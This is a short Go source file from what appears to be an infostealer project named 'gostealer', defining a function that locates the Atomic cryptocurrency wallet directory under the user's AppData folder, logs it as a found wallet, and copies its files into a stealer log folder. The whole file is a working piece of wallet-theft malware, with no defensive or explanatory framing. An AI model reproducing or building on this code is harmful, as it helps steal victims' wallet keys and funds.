package wallets

import (
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyAtomic(logFolderPath string) {
	atomic := path.Join(os.Getenv("appdata"), "atomic")

	if _, err := os.Stat(atomic); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "atomic\n"
	}
	//________________

	utils.CopyFolderFiles(atomic, path.Join(logFolderPath, "wallets", "Atomic"))
}
